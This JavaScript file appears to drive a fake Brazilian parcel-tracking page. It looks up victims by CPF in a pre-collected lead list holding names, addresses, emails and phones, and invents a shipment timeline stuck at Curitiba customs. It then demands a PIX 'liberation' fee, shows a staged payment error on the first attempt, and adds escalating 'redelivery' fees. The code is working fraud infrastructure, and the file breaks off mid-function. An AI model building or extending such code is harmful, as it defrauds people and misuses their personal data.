/**
 * Sistema de rastreamento principal
 */
import { DatabaseService } from '../services/database.js';
import { DataService } from '../utils/data-service.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { ZentraPayService } from '../services/zentra-pay.js';

export class TrackingSystem {
    constructor() {
        this.dbService = new DatabaseService();
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.currentCPF = null;
        this.trackingData = null;
        this.userData = null;
        this.isInitialized = false;
        this.pixData = null;
        this.paymentAttempts = 0; // Contador de tentativas de pagamento
        this.maxPaymentAttempts = 2; // Máximo 2 tentativas
        
        console.log('TrackingSystem inicializado');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Fallbacks
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            this.validateZentraPaySetup();
            
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        if (this.zentraPayService.validateApiSecret()) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        
        this.setupFormSubmission();
        this.setupCPFInput();
        this.setupTrackButton();
        this.setupModalEvents();
        this.setupCopyButtons();
        this.setupAccordion();
        this.setupKeyboardEvents();
        
        console.log('Event listeners configurados');
    }

    setupFormSubmission() {
        const form = document.getElementById('trackingForm');
        if (form) {
            console.log('Form encontrado por ID');
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        // Fallback para todos os forms
        document.querySelectorAll('form').forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        const trackButton = document.getElementById('trackButton');
        if (trackButton) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButton);
        }

        // Configurar por classe
        document.querySelectorAll('.track-button').forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        // Configurar por texto
        document.querySelectorAll('button[type="submit"], button').forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        // Event delegation como fallback
        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        // Remover listeners existentes clonando o elemento
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        // Garantir que seja clicável
        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');

        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const cleanText = pastedText.replace(/[^\d]/g, '');
            
            if (cleanText.length <= 11) {
                cpfInput.value = cleanText;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        const isCtrlA = e.keyCode === 65 && e.ctrlKey;
        const isCtrlC = e.keyCode === 67 && e.ctrlKey;
        const isCtrlV = e.keyCode === 86 && e.ctrlKey;
        const isCtrlX = e.keyCode === 88 && e.ctrlKey;

        if (allowedKeys.includes(e.keyCode) || isCtrlA || isCtrlC || isCtrlV || isCtrlX) {
            return;
        }

        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;

        const cleanCPF = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cleanCPF.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cleanCPF.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO BUSCA NO BANCO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            this.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }

        const cpfValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfValue);
        
        console.log('CPF digitado:', cpfValue);
        console.log('CPF limpo:', cleanCPF);

        if (!CPFValidator.isValidCPF(cpfValue)) {
            console.log('CPF inválido');
            this.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        console.log('CPF válido, buscando no banco...');
        this.showLoadingNotification();

        // Desabilitar botões durante processamento
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Delay para UX
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            console.log('🔍 Buscando no banco de dados...');
            const result = await this.getLeadFromDatabase(cleanCPF);
            
            if (result.success && result.data) {
                console.log('✅ LEAD ENCONTRADO NO BANCO!');
                console.log('📦 Dados do lead:', result.data);
                
                this.leadData = result.data;
                this.currentCPF = cleanCPF;
                
                this.closeLoadingNotification();
                
                console.log('📋 Exibindo dados do banco...');
                this.displayOrderDetailsFromDatabase();
                this.generateRealTrackingData();
                this.displayTrackingResults();
                this.saveTrackingData();

                // Scroll para resultados
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    this.scrollToElement(orderDetails, 100);
                }

                // Destacar botão de liberação se necessário
                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1500);

            } else {
                console.log('❌ CPF não encontrado no banco');
                this.closeLoadingNotification();
                this.showError('CPF inexistente. Não encontramos sua encomenda.');
            }

        } catch (error) {
            console.error('Erro no processo:', error);
            this.closeLoadingNotification();
            this.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            // Restaurar botões
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    async getLeadFromDatabase(cpf) {
        return await this.dbService.getLeadByCPF(cpf);
    }

    displayOrderDetailsFromDatabase() {
        if (!this.leadData) return;

        console.log('📋 Exibindo dados do banco de dados');
        
        const firstName = this.getFirstAndLastName(this.leadData.nome_completo || 'Nome não informado');
        const formattedCPF = CPFValidator.formatCPF(this.leadData.cpf || '');
        
        this.updateElement('customerName', firstName);
        this.updateElement('fullName', this.leadData.nome_completo || 'Nome não informado');
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', firstName);

        // Produto
        let productName = 'Produto não informado';
        if (this.leadData.produtos && this.leadData.produtos.length > 0) {
            productName = this.leadData.produtos[0].nome || 'Produto não informado';
        }
        this.updateElement('customerProduct', productName);

        // Endereço
        const address = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerFullAddress', address);

        console.log('✅ Interface atualizada com dados do banco');
        console.log('👤 Nome exibido:', firstName);
        console.log('📄 Nome completo:', this.leadData.nome_completo);
        console.log('📍 Endereço:', address);
        console.log('📦 Produto:', productName);

        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }

    generateRealTrackingData() {
        console.log('📦 Gerando dados de rastreamento reais do banco');
        
        if (!this.leadData) return;

        const currentStage = this.leadData.etapa_atual || 1;
        const stageNames = this.getStageNames();

        this.trackingData = {
            cpf: this.leadData.cpf,
            currentStep: currentStage,
            steps: [],
            liberationPaid: this.leadData.status_pagamento === 'pago',
            liberationDate: this.leadData.status_pagamento === 'pago' ? new Date().toISOString() : null,
            deliveryAttempts: 0,
            lastUpdate: this.leadData.updated_at || new Date().toISOString()
        };

        // Gerar etapas até a atual (máximo 26)
        for (let i = 1; i <= Math.max(currentStage, 26); i++) {
            const stepDate = new Date();
            stepDate.setHours(stepDate.getHours() - (Math.max(currentStage, 26) - i));

            this.trackingData.steps.push({
                id: i,
                date: stepDate,
                title: stageNames[i] || `Etapa ${i}`,
                description: stageNames[i] || `Etapa ${i}`,
                isChina: i >= 3 && i <= 7,
                completed: i <= currentStage,
                needsLiberation: i === 11 && this.leadData.status_pagamento !== 'pago',
                needsDeliveryPayment: (i === 16 || i === 20 || i === 24) && this.leadData.status_pagamento === 'pago',
                deliveryAttempt: i === 16 ? 1 : i === 20 ? 2 : i === 24 ? 3 : null
            });
        }

        console.log('✅ Dados de rastreamento gerados baseados no banco');
        console.log('📊 Etapa atual:', currentStage);
        console.log('💳 Status pagamento:', this.leadData.status_pagamento);
    }

    getStageNames() {
        return {
            1: 'Seu pedido foi criado',
            2: 'O seu pedido está sendo preparado para envio',
            3: '[China] O vendedor enviou seu pedido',
            4: '[China] O pedido chegou ao centro de triagem de Shenzhen',
            5: '[China] Pedido saiu do centro logístico de Shenzhen',
            6: '[China] Coletado. O pedido está em trânsito internacional',
            7: '[China] O pedido foi liberado na alfândega de exportação',
            8: 'Pedido saiu da origem: Shenzhen',
            9: 'Pedido chegou no Brasil',
            10: 'Pedido em trânsito para CURITIBA/PR',
            11: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
            12: 'Pedido liberado na alfândega de importação',
            13: 'Pedido sairá para entrega',
            14: 'Pedido em trânsito entrega',
            15: 'Pedido em rota de entrega',
            16: 'Tentativa entrega',
            17: 'Pedido liberado para nova tentativa de entrega',
            18: 'Pedido liberado, em trânsito',
            19: 'Pedido em rota de entrega para o endereço',
            20: 'Tentativa de entrega',
            21: 'Pedido liberado para nova tentativa de entrega',
            22: 'Pedido liberado, em trânsito',
            23: 'Pedido em rota de entrega para o endereço',
            24: 'Tentativa de entrega',
            25: 'Pedido liberado para nova tentativa de entrega',
            26: 'Pedido em rota de entrega para o endereço'
        };
    }

    displayTrackingResults() {
        this.updateStatus();
        this.renderTimeline();
        
        setTimeout(() => {
            this.animateTimeline();
        }, 500);
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;

        let statusText = '';
        if (this.leadData && this.leadData.etapa_atual) {
            statusText = this.getStageNames()[this.leadData.etapa_atual] || `Etapa ${this.leadData.etapa_atual}`;
        } else {
            statusText = 'Pedido chegou na alfândega de importação: CURITIBA/PR';
        }

        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;

        if (currentStage >= 17) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else if (currentStage >= 13) {
            statusIcon.innerHTML = '<i class="fas fa-truck"></i>';
            statusIcon.className = 'status-icon in-delivery';
        } else if (currentStage >= 12) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
        }

        currentStatus.textContent = statusText;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        timeline.innerHTML = '';
        
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;

        this.trackingData.steps.forEach((step) => {
            if (step.id <= currentStage) {
                const isLast = step.id === currentStage;
                const timelineItem = this.createTimelineItem(step, isLast);
                timeline.appendChild(timelineItem);
            }
        });
    }

    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''} ${isLast ? 'last' : ''}`;

        const stepDate = this.leadData && this.leadData.updated_at ? 
            new Date(this.leadData.updated_at) : new Date();
        
        const dateStr = stepDate.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = stepDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;

        // Botão "Liberar Objeto" - apenas na etapa 11 se não foi pago
        if (step.showLiberationButton && step.completed && !this.liberationPaid) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-step-id="${step.id}" id="liberarPacoteButton">
                    <i class="fas fa-unlock"></i> Liberar Pacote
                </button>
            `;
        }

        // Botões "Reenviar Pacote" nas etapas corretas
        if (step.needsDeliveryPayment && step.deliveryAttempt) {
            const values = { 1: '9,74', 2: '14,98', 3: '18,96' };
            const value = values[step.deliveryAttempt];
            if (step.needsDeliveryPayment && step.completed && step.deliveryAttempt) {
                buttonHtml = `
                    <button class="delivery-button-timeline" data-step-id="${step.id}" data-attempt="${step.deliveryAttempt}" data-value="${step.deliveryValue}">
                        <i class="fas fa-redo"></i> REENVIAR PACOTE
                    </button>
                `;
            }
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${step.isChina ? '<span class="china-tag">[China]</span>' : ''}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões
        if ((step.id === 11 || step.id === 12) && currentStage <= 12) {
            const liberationButton = item.querySelector('.liberation-button-timeline');
            if (liberationButton) {
                liberationButton.addEventListener('click', () => {
                    this.openLiberationModal();
                });
            }
        }

        if (step.needsDeliveryPayment && step.deliveryAttempt) {
            const deliveryButton = item.querySelector('.delivery-retry-button');
            if (deliveryButton) {
                deliveryButton.addEventListener('click', () => {
                    this.openDeliveryPaymentModal(step.deliveryAttempt, step.id);
                });
            }
        }

        return item;
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            this.scrollToElement(liberationButton, window.innerHeight / 2);
            
            setTimeout(() => {
                liberationButton.style.animation = 'pulse 2s infinite, glow 2s ease-in-out';
                liberationButton.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.8)';
                
                setTimeout(() => {
                    liberationButton.style.animation = 'pulse 2s infinite';
                    liberationButton.style.boxShadow = '0 4px 15px rgba(255, 107, 53, 0.4)';
                }, 6000);
            }, 500);
        }
    }

    setupModalEvents() {
        const closeModal = document.getElementById('closeModal');
        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeModal('liberationModal');
            });
        }

        const closeDeliveryModal = document.getElementById('closeDeliveryModal');
        if (closeDeliveryModal) {
            closeDeliveryModal.addEventListener('click', () => {
                this.closeModal('deliveryModal');
            });
        }

        // Fechar modal ao clicar fora
        ['liberationModal', 'deliveryModal'].forEach(modalId => {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.addEventListener('click', (e) => {
                    if (e.target.id === modalId) {
                        this.closeModal(modalId);
                    }
                });
            }
        });
    }

    setupCopyButtons() {
        const copyButtons = [
            { buttonId: 'copyPixButtonModal', inputId: 'pixCodeModal' },
            { buttonId: 'copyPixButtonDelivery', inputId: 'pixCodeDelivery' }
        ];

        copyButtons.forEach(({ buttonId, inputId }) => {
            const button = document.getElementById(buttonId);
            if (button) {
                button.addEventListener('click', () => {
                    this.copyPixCode(inputId, buttonId);
                });
            }
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => {
                this.toggleAccordion();
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeModal('liberationModal');
                this.closeModal('deliveryModal');
                this.closeLoadingNotification();
            }
        });
    }

    // FLUXO DE LIBERAÇÃO COM 2 TENTATIVAS DE PAGAMENTO
    async openLiberationModal() {
        console.log('🚀 Abrindo modal de liberação - Tentativa:', this.paymentAttempts + 1);
        
        this.showLoadingNotification();

        try {
            if (!this.zentraPayService.validateApiSecret()) {
                throw new Error('API Secret do Zentra Pay não configurada corretamente');
            }

            const value = window.valor_em_reais || 26.34;
            console.log('💰 Valor da transação:', `R$ ${value.toFixed(2)}`);

            const customerData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };

            console.log('👤 Dados do cliente para pagamento:', customerData);
            console.log('📡 Enviando requisição para Zentra Pay...');

            const result = await this.zentraPayService.createPixTransaction(customerData, value);

            if (result.success) {
                console.log('🎉 PIX gerado com sucesso!');
                this.pixData = result;
                
                this.closeLoadingNotification();
                
                setTimeout(() => {
                    this.displayRealPixModal();
                    setTimeout(() => {
                        this.guideToCopyButton();
                    }, 800);
                }, 300);

            } else {
                throw new Error(result.error || 'Erro desconhecido ao gerar PIX');
            }

        } catch (error) {
            console.error('💥 Erro ao gerar PIX:', error);
            this.closeLoadingNotification();
            this.showError(`Erro ao gerar PIX: ${error.message}`);
            
            // Mostrar modal estático como fallback
            setTimeout(() => {
                console.log('⚠️ Exibindo modal estático como fallback');
                this.displayStaticPixModal();
                setTimeout(() => {
                    this.guideToCopyButton();
                }, 800);
            }, 1000);
        }
    }

    displayRealPixModal() {
        console.log('🎯 Exibindo modal com dados reais do PIX...');

        // Atualizar QR Code
        const qrCodeImg = document.getElementById('realPixQrCode');
        if (qrCodeImg && this.pixData.pixPayload) {
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
            qrCodeImg.src = qrCodeUrl;
            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
            console.log('✅ QR Code atualizado com dados reais da API oficial');
        }

        // Atualizar código PIX
        const pixInput = document.getElementById('pixCodeModal');
        if (pixInput && this.pixData.pixPayload) {
            pixInput.value = this.pixData.pixPayload;
            console.log('✅ Código PIX Copia e Cola atualizado com dados reais da API oficial');
        }

        // Mostrar modal
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            console.log('🎯 Modal PIX real exibido com sucesso');
            
            // Adicionar botão de simulação após delay
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }

        console.log('🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!');
    }

    displayStaticPixModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Adicionar botão de simulação
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }
        console.log('⚠️ Modal PIX estático exibido como fallback');
    }

    addPaymentSimulationButton() {
        const modalContent = document.querySelector('.professional-modal-content');
        if (!modalContent || document.getElementById('simulatePaymentButton')) return;

        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `;

        buttonContainer.innerHTML = `
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `;

        modalContent.appendChild(buttonContainer);

        const simulateButton = document.getElementById('simulatePaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulatePayment();
            });

            // Efeitos hover
            simulateButton.addEventListener('mouseenter', function() {
                this.style.background = 'rgba(0, 0, 0, 0.05)';
                this.style.transform = 'translateY(-1px)';
                this.style.opacity = '1';
            });

            simulateButton.addEventListener('mouseleave', function() {
                this.style.background = 'transparent';
                this.style.transform = 'translateY(0)';
                this.style.opacity = '0.7';
            });
        }
    }

    // FLUXO DE 2 TENTATIVAS DE PAGAMENTO
    simulatePayment() {
        this.paymentAttempts++;
        console.log(`💳 Tentativa de pagamento: ${this.paymentAttempts}/${this.maxPaymentAttempts}`);

        this.closeModal('liberationModal');

        if (this.paymentAttempts === 1) {
            // Primeira tentativa - mostrar erro
            setTimeout(() => {
                this.showPaymentError();
            }, 1000);
        } else if (this.paymentAttempts >= this.maxPaymentAttempts) {
            // Segunda tentativa - sucesso
            this.paymentAttempts = 0; // Reset para próximas vezes
            this.processSuccessfulPayment();
        }
    }

    showPaymentError() {
        const errorOverlay = document.createElement('div');
        errorOverlay.id = 'paymentErrorOverlay';
        errorOverlay.className = 'modal-overlay';
        errorOverlay.style.display = 'flex';

        errorOverlay.innerHTML = `
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(errorOverlay);
        document.body.style.overflow = 'hidden';

        // Configurar eventos
        const closeButton = document.getElementById('closePaymentErrorModal');
        const retryButton = document.getElementById('retryPaymentButton');

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }

        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                this.openLiberationModal(); // Reabrir modal de pagamento
            });
        }

        errorOverlay.addEventListener('click', (e) => {
            if (e.target === errorOverlay) {
                this.closePaymentErrorModal();
            }
        });
    }

    closePaymentErrorModal() {
        const errorOverlay = document.getElementById('paymentErrorOverlay');
        if (errorOverlay) {
            errorOverlay.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorOverlay.parentNode) {
                    errorOverlay.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    async processSuccessfulPayment() {
        console.log('🎉 Processando pagamento bem-sucedido...');

        // Atualizar dados de rastreamento
        if (this.trackingData) {
            this.trackingData.liberationPaid = true;
        }

        // Atualizar no banco de dados
        if (this.leadData) {
            await this.updatePaymentStatusInDatabase('pago');
        }

        // Ocultar botão de liberação
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            liberationButton.style.display = 'none';
        }

        // Mostrar notificação de sucesso
        this.showSuccessNotification();

        // Adicionar etapas pós-pagamento
        setTimeout(() => {
            this.addPostPaymentSteps();
        }, 1000);
    }

    addPostPaymentSteps() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const stageNames = this.getStageNames();
        const postPaymentSteps = [12, 13, 14, 15, 16]; // Etapas após pagamento

        postPaymentSteps.forEach((stepId, index) => {
            setTimeout(() => {
                const stepDate = new Date();
                const timelineItem = this.createTimelineItem({
                    id: stepId,
                    date: stepDate,
                    title: stageNames[stepId],
                    description: stageNames[stepId],
                    isChina: false,
                    completed: true,
                    needsLiberation: false,
                    needsDeliveryPayment: stepId === 16,
                    deliveryAttempt: stepId === 16 ? 1 : null
                }, index === postPaymentSteps.length - 1);

                timeline.appendChild(timelineItem);

                setTimeout(() => {
                    timelineItem.style.opacity = '1';
                    timelineItem.style.transform = 'translateY(0)';
                }, 100);

                timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });

            }, index * 30000); // 30 segundos entre cada etapa
        });
    }

    async updatePaymentStatusInDatabase(status) {
        if (this.currentCPF) {
            try {
                const leads = JSON.parse(localStorage.getItem('leads') || '[]');
                const leadIndex = leads.findIndex(lead => 
                    lead.cpf && lead.cpf.replace(/[^\d]/g, '') === this.currentCPF
                );

                if (leadIndex !== -1) {
                    leads[leadIndex].status_pagamento = status;
                    leads[leadIndex].etapa_atual = 12; // Avançar para etapa 12
                    leads[leadIndex].updated_at = new Date().toISOString();
                    
                    localStorage.setItem('leads', JSON.stringify(leads));
                    console.log('✅ Status de pagamento atualizado no localStorage:', status);
                }
            } catch (error) {
                console.error('❌ Erro ao atualizar status no localStorage:', error);
            }
        }
    }

    showSuccessNotification() {
        const notification = document.createElement('div');
        notification.className = 'payment-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `;

        document.body.appendChild(notification);

        // Adicionar animações CSS se não existirem
        if (!document.getElementById('notificationAnimations')) {
            const style = document.createElement('style');
            style.id = 'notificationAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    // MODAL DE REENVIO PARA ETAPAS 16, 20, 24
    async openDeliveryPaymentModal(attemptNumber, stepId) {
        console.log(`🚀 Abrindo modal de pagamento para ${attemptNumber}ª tentativa de entrega...`);
        
        const deliveryValues = { 1: 9.74, 2: 14.98, 3: 18.96 };
        const value = deliveryValues[attemptNumber];

        this.showLoadingNotification();

        try {
            if (!this.zentraPayService.validateApiSecret()) {
                throw new Error('API Secret do Zentra Pay não configurada corretamente');
            }

            console.log(`💰 Valor da taxa de reenvio: R$ ${value.toFixed(2)}`);

            const customerData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };

            console.log('📡 Gerando PIX para taxa de reenvio...');
            const result = await this.zentraPayService.createPixTransaction(customerData, value);

            if (result.success) {
                console.log('🎉 PIX de reenvio gerado com sucesso!');
                this.deliveryPixData = result;
                
                this.closeLoadingNotification();
                
                setTimeout(() => {
                    this.displayDeliveryPaymentModal(attemptNumber, value, stepId);
                }, 300);

            } else {
                throw new Error(result.error || 'Erro desconhecido ao gerar PIX de reenvio');
            }

        } catch (error) {
            console.error('💥 Erro ao gerar PIX de reenvio:', error);
            this.closeLoadingNotification();
            
            // Mostrar modal estático como fallback
            setTimeout(() => {
                this.displayDeliveryPaymentModal(attemptNumber, value, stepId, true);
            }, 1000);
        }
    }

    displayDeliveryPaymentModal(attemptNumber, value, stepId, isStatic = false) {
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPaymentModal';
        modal.style.display = 'flex';

        // Determinar QR Code e PIX payload
        let qrCodeSrc, pixPayload;
        
        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
            pixPayload = this.deliveryPixData.pixPayload;
            console.log('✅ Usando PIX real do Zentra Pay para reenvio');
        } else {
